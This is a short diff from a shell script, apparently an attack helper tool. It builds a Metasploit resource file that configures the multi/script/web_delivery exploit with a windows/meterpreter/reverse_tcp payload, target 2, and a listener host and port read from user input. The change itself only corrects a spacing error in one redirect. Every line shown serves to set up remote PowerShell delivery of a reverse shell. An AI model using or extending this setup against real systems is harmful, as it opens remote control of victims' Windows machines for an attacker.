@@ -130,7 +130,7 @@
     read port
     echo  "################################################################## "
     echo "use exploit/multi/script/web_delivery" >> resource/powershell.rc
-    echo "set PAYLOAD windows/meterpreter/reverse_tcp" >>resource/ powershell.rc
+    echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> resource/powershell.rc
     echo "set TARGET 2" >> resource/powershell.rc
     echo "set LHOST $ip" >> resource/powershell.rc
     echo "set LPORT $port" >> resource/powershell.rc
